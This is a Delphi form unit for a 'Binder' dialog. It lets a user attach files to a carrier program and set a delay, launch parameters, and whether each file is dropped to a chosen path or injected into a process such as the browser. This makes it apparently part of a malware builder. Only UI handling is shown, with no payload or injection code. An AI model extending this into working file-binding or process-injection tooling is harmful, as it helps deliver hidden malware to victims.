unit U_FrmBinder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, bsSkinBoxCtrls, StdCtrls, bsSkinCtrls, AdvCombo, AdvSmoothButton,
  Mask, AdvSmoothLabel, ExtCtrls,ComCtrls;

type
  TFrm_Binder = class(TForm)
    Panel1: TPanel;
    AdvSmoothLabel2: TAdvSmoothLabel;
    FB_EditFile: TbsSkinEdit;
    FE_Ok: TAdvSmoothButton;
    AdvSmoothLabel1: TAdvSmoothLabel;
    FB_EditParam: TbsSkinEdit;
    AdvSmoothLabel3: TAdvSmoothLabel;
    FB_EditlDelay: TbsSkinNumericEdit;
    AdvSmoothLabel4: TAdvSmoothLabel;
    AdvSmoothLabel5: TAdvSmoothLabel;
    FB_ComboExec: TAdvComboBox;
    FB_GroupBox: TbsSkinGroupBox;
    FB_L_ExecPath: TbsSkinStdLabel;
    FB_L_ExecName: TbsSkinStdLabel;
    FB_C_ExecPath: TbsSkinComboBox;
    FB_C_ExecName: TbsSkinEdit;
    AdvSmoothButton1: TAdvSmoothButton;
    FE_Cancel: TAdvSmoothButton;
    procedure FE_OkClick(Sender: TObject);
    procedure FB_ComboExecChange(Sender: TObject);
    procedure FB_C_ExecPathChange(Sender: TObject);
    procedure FE_CancelClick(Sender: TObject);
    procedure AdvSmoothButton1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Frm_Binder: TFrm_Binder;

implementation

{$R *.dfm}
uses
U_Type,U_Utils,U_FrmMain;

procedure TFrm_Binder.AdvSmoothButton1Click(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
X : String;
begin
  if Frm_Binder.Caption = 'Binder Add' then
  begin
    if (FB_EditFile.Text <> '') and FileExists(FB_EditFile.Text) then
    begin
      List := Frm_Main.List_Binder.Items.Add;
      List.Caption := FB_EditFile.Text;
      List.SubItems.Add(Get_File_Size(FB_EditFile.Text,true));
      new(data);
      Data^.Delay := Trunc(FB_EditlDelay.Value);
      Data^.Exec := FB_ComboExec.ItemIndex;
      Data^.Path := FB_C_ExecPath.ItemIndex;
      Data^.Name := FB_C_ExecName.Text;
      Data^.Parameter :=  FB_EditParam.Text;
      List.Data := Data;
      Close;
    end else
      showmessage('Your File Not Exists, Please Input Correct File...!!!');
  end else
  if (Pos('der Edit ',Frm_Binder.Caption) <> 0) then
  begin
    if (FB_EditFile.Text <> '') and FileExists(FB_EditFile.Text) then
    begin
      X := Frm_Binder.Caption;
      delete(x,1,12);
      List := Frm_Main.List_Binder.Items.Item[strtoint(x)];
      Data := List.Data;
      List.Caption := FB_EditFile.Text;
      List.SubItems[0] := Get_File_Size(FB_EditFile.Text,true);
      Data^.Delay := Trunc(FB_EditlDelay.Value);
      Data^.Exec := FB_ComboExec.ItemIndex;
      Data^.Path := FB_C_ExecPath.ItemIndex;
      Data^.Name := FB_C_ExecName.Text;
      Data^.Parameter :=  FB_EditParam.Text;
      List.Data := Data;
      Close;
    end else
      showmessage('Your File Not Exists, Please Input Correct File...!!!');
  end;
end;

procedure TFrm_Binder.FB_ComboExecChange(Sender: TObject);
begin
  if FB_ComboExec.ItemIndex = 0 then
  begin
    FB_L_ExecName.Enabled := false;
    FB_L_ExecPath.Enabled := false;
    FB_C_ExecName.Enabled := false;
    FB_C_ExecPath.Enabled := false;
    FB_C_ExecName.Text := '';
    FB_C_ExecPath.ItemIndex := -1;
  end else
  if FB_ComboExec.ItemIndex = 1 then
  begin
    FB_GroupBox.Caption := 'Drop Destination : ';
    FB_L_ExecName.Enabled := true;
    FB_C_ExecName.Enabled := true;
    FB_L_ExecPath.Enabled := true;
    FB_C_ExecPath.Enabled := true;
    FB_C_ExecName.Text := '';
    if FB_C_ExecPath.Items[0] = 'Browser' then
    begin
      FB_C_ExecPath.Items.Delete(0);
    end;
    FB_C_ExecPath.ItemIndex := 0;
  end else
  if FB_ComboExec.ItemIndex = 2 then
  begin
    FB_GroupBox.Caption := 'Injection To : ';
    FB_L_ExecPath.Enabled := true;
    FB_C_ExecPath.Enabled := true;
    FB_L_ExecName.Enabled := false;
    FB_C_ExecName.Enabled := false;
    FB_C_ExecName.Text := '';
    if FB_C_ExecPath.Items[0] <> 'Browser' then
    begin
      FB_C_ExecPath.Items.Insert(0,'Browser');
    end;
    FB_C_ExecPath.ItemIndex := 0;
  end;
end;

procedure TFrm_Binder.FB_C_ExecPathChange(Sender: TObject);
begin
  if FB_C_ExecPath.Text = 'Browser' then
  begin
    FB_L_ExecName.Enabled := false;
    FB_C_ExecName.Enabled := false;
  end else
  begin
    FB_L_ExecName.Enabled := true;
    FB_C_ExecName.Enabled := true;
  end;
end;

procedure TFrm_Binder.FE_CancelClick(Sender: TObject);
begin
  Close;
end;

procedure TFrm_Binder.FE_OkClick(Sender: TObject);
begin
  Frm_Main.opendialog.InitialDir := extractfilepath(paramstr(0));
  Frm_Main.opendialog.Filter := 'Binded Files|*.*';
  Frm_Main.opendialog.FileName := '';
  if Frm_Main.opendialog.Execute Then
  begin
    if (Frm_Main.opendialog.FileName <> '') and fileexists(Frm_Main.opendialog.FileName) then
      FB_EditFile.Text := Frm_Main.opendialog.FileName;
  end;
end;

end.
